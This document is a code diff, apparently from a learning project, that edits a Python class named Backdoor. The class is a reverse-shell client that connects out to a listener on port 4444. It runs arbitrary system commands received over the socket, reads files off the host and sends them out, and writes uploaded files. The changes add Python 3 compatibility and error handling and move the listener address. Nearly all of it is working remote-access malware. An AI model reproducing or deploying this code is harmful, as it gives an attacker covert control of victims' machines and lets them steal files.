@@ -8,15 +8,12 @@ class Backdoor:
 		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])
 
 	def reliable_send(self, data): # encodes the sending message into JSON for serialization
-		try:
-			data = data.decode()
-		except (UnicodeDecodeError, AttributeError):
-			pass
 		json_data = json.dumps(data) # encodes
 		self.connection.send(json_data.encode()) # sends via encoded message through socket
+		# encode() for byte-type encode for p3 compatibility
 	
 	def reliable_recv(self): # decodes the receiving message from JSON to plain text
-		json_data = b""
+		json_data = b"" # byte type object -string- (P3 comp)
 		while True:
 			try: # if the data is higher that buffer size, iterates
 				json_data = json_data + self.connection.recv(1024) # recieves encoded message
@@ -43,24 +40,28 @@ class Backdoor:
 	def run(self):
 		while True:
 			command = self.reliable_recv() # receives a command
-			
-			if command[0] == "stop": 
-				self.connection.close() # close socket
-				exit() # stops program
-			
-			elif command[0] == 'cd' and len(command) > 1: 	# change dir
-				command_result = self.change_dir(command[1])
-			
-			elif command[0] == 'download': 	
-				command_result = self.read_file(command[1]) # return file content
-			
-			elif command[0] == 'upload': # parse file path and content to upload file to client
-				command_result = self.write_file(command[1], command[2]) 
+
+			try:
+				if command[0] == "stop": 
+					self.connection.close() # close socket
+					exit() # stops program
 				
-			else:			
-				command_result = self.execute_system_commands(command) # executes
+				elif command[0] == 'cd' and len(command) > 1: 	# change dir
+					command_result = self.change_dir(command[1]) 
+				
+				elif command[0] == 'download': # decode() for p3 compatibility
+					command_result = self.read_file(command[1]).decode() # return file content
+				
+				elif command[0] == 'upload': # parse file path and content to upload file to client
+					command_result = self.write_file(command[1], command[2]) 
+					
+				else: # executes. Decode() for p3 compatibility
+					command_result = self.execute_system_commands(command).decode() 
+					
+			except Exception:
+				command_result = "[-] Error during command execution."
 		
 			self.reliable_send(command_result) # returns the command output
 
-my_backdoor = Backdoor("192.168.0.10", 4444) # listener's IP and port
+my_backdoor = Backdoor("192.168.0.199", 4444) # listener's IP and port
 my_backdoor.run()
